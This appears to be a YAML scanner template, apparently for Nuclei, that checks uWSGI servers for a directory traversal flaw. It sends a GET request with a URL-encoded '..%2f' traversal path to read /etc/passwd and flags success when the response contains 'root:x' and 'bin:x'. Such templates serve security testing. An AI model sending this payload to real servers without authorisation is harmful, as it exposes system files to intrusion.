id: uwsgi-fileRead
info:
  author: str1am
  name: "uwsgi\u76EE\u5F55\u904D\u5386\u6F0F\u6D1E"
  severity: high
  tags: uwsgi
requests:
- matchers:
  - status:
    - 200
    type: status
  - condition: and
    part: body
    type: word
    words:
    - root:x
    - bin:x
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd'
